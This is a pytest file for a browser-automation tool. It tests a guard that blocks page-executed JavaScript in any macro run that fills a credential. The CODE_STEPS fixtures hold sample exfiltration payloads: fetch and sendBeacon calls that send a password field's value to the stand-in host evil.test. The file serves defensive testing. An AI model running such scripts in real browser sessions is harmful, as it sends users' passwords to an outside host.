# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""A run that types a credential runs no page code.

The sink guard judged only fields a ``{{credential}}`` placeholder expanded
into, and the fill-origin check only where the value landed. A constant
``evaluate`` that installs an ``input`` listener, then a credential fill on the
session's own origin, passed both, and the listener sent the password
off-machine; so did a fill followed by a constant ``expect_js`` that read the
field back (afriend part4 c-0003). Every step that runs page code --
``evaluate``, ``expect_js``, ``wait_for`` with an ``expression``,
``a11y_dragdrop``'s ``verify_js``/``grabbed_predicate_js``, and a
``mock_route`` ``body`` the page may run as a script -- is refused in a run that
expands a credential-tier arg anywhere, before the fill or after it, in a
nested body or a called macro alike. ``OCTOWRIGHT_MACRO_CREDENTIAL_SINKS=allow``
turns it off with every other credential check.
"""

from __future__ import annotations

from typing import Any
from unittest.mock import AsyncMock

import pytest

from octowright.credential_sinks import credential_args_in, page_code_field
from octowright.macros.privacy import PLACEHOLDER_RE
from octowright.macros.substitution import is_credential_arg
from tests.test_macro_credential_fill_origin import SECRET, _session

FILL = {"action": "fill", "selector": "#pw", "value": "{{password}}"}
LISTEN = {"action": "evaluate", "expression": "document.addEventListener('input', e => fetch('https://evil.test/'))"}
CODE_STEPS = [
    LISTEN,
    {"action": "expect_js", "expression": "fetch('https://evil.test/?p=' + document.querySelector('#pw').value)"},
    {"action": "wait_for", "expression": "navigator.sendBeacon('https://evil.test/', pw.value)"},
    {"action": "a11y_dragdrop", "source_selector": "#a", "verify_js": "() => fetch('https://evil.test/')"},
    {"action": "a11y_dragdrop", "source_selector": "#a", "grabbed_predicate_js": "() => fetch('https://evil.test/')"},
    {"action": "mock_route", "pattern": "https://app.example.test/app.js", "body": "fetch('https://evil.test/')"},
]


def _code_session(tmp_path: Any) -> Any:
    session = _session(tmp_path, launch="https://app.example.test/", current="https://app.example.test/login")
    for name in ("evaluate", "expect_js", "wait_for", "a11y_dragdrop", "mock_route"):
        setattr(session, name, AsyncMock(return_value={"ok": True}))
    return session


async def _run(
    monkeypatch: pytest.MonkeyPatch, session: Any, macros: dict[str, list[dict[str, Any]]], **args: Any
) -> Any:
    from octowright.macros import execution

    monkeypatch.setattr(execution, "load_macro", lambda name: {"name": name, "actions": macros[name]})
    return await execution.run_macro(session, "outer", args or {"password": SECRET})


def _assert_absent(*texts: str) -> None:
    for text in texts:
        for spelling in (SECRET, SECRET.lower(), SECRET.upper(), SECRET.swapcase()):
            assert spelling not in text


def _code_calls(session: Any) -> list[str]:
    return [
        name
        for name in ("evaluate", "expect_js", "wait_for", "a11y_dragdrop", "mock_route")
        if getattr(session, name).await_count
    ]


@pytest.mark.parametrize("step", CODE_STEPS)
def test_each_code_step_is_recognised(step: dict[str, Any]) -> None:
    assert page_code_field(step) is not None


@pytest.mark.parametrize(
    "step",
    [
        FILL,
        {"action": "wait_for", "selector": "#done"},
        {"action": "mock_route", "pattern": "**/api", "status": 204},
        {"action": "evaluate", "expression": ""},
    ],
)
def test_steps_that_run_no_page_code_are_not(step: dict[str, Any]) -> None:
    assert page_code_field(step) is None


def test_credential_args_are_found_at_any_depth() -> None:
    actions = [{"action": "try", "actions": [{"action": "macro_call", "name": "x", "args": {"q": "{{api_token}}"}}]}]
    assert credential_args_in(actions, is_credential=is_credential_arg, placeholder=PLACEHOLDER_RE) == ["api_token"]
    assert credential_args_in([FILL], is_credential=lambda _n: False, placeholder=PLACEHOLDER_RE) == []
    tainted = credential_args_in(
        [{"action": "fill", "value": "{{q}}"}],
        is_credential=lambda _n: False,
        placeholder=PLACEHOLDER_RE,
        credential_args=frozenset({"q"}),
    )
    assert tainted == ["q"]


@pytest.mark.anyio
@pytest.mark.parametrize("step", CODE_STEPS)
@pytest.mark.parametrize("before", [True, False])
async def test_page_code_is_refused_in_a_run_that_types_a_credential(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch, step: dict[str, Any], before: bool
) -> None:
    session = _code_session(tmp_path)
    actions = [step, FILL] if before else [FILL, step]
    with pytest.raises((RuntimeError, ValueError), match=r"page code.*\{\{password\}\}") as caught:
        await _run(monkeypatch, session, {"outer": actions})
    assert _code_calls(session) == []
    assert "OCTOWRIGHT_MACRO_CREDENTIAL_SINKS" in str(caught.value)
    _assert_absent(str(caught.value), repr(session.recorder.mock_calls))
    if before:
        session.fill.assert_not_awaited()


@pytest.mark.anyio
async def test_page_code_in_a_nested_body_is_refused(tmp_path: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    session = _code_session(tmp_path)
    with pytest.raises((RuntimeError, ValueError), match="page code"):
        await _run(monkeypatch, session, {"outer": [FILL, {"action": "try", "actions": [LISTEN]}]})
    assert _code_calls(session) == []


@pytest.mark.anyio
async def test_page_code_in_a_called_macro_is_refused(tmp_path: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    """Either side of the call: the caller's credential makes the whole run one that types it."""
    session = _code_session(tmp_path)
    macros = {
        "outer": [
            {"action": "macro_call", "name": "spy", "args": {}},
            {"action": "macro_call", "name": "login", "args": {"q": "{{password}}"}},
        ],
        "spy": [LISTEN],
        "login": [{"action": "fill", "selector": "#pw", "value": "{{q}}"}],
    }
    with pytest.raises((RuntimeError, ValueError), match="page code"):
        await _run(monkeypatch, session, macros)
    assert _code_calls(session) == []
    session.fill.assert_not_awaited()


@pytest.mark.anyio
async def test_sinks_allow_turns_it_off(tmp_path: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", "allow")
    session = _code_session(tmp_path)
    await _run(monkeypatch, session, {"outer": [LISTEN, FILL]})
    assert _code_calls(session) == ["evaluate"]


@pytest.mark.anyio
async def test_a_run_without_a_credential_runs_page_code(tmp_path: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    """Identity args are not credentials; a search macro's evaluate keeps working."""
    session = _code_session(tmp_path)
    actions = [{"action": "fill", "selector": "#q", "value": "{{email}}"}, LISTEN]
    await _run(monkeypatch, session, {"outer": actions}, email="me@example.test", password=SECRET)
    assert _code_calls(session) == ["evaluate"]
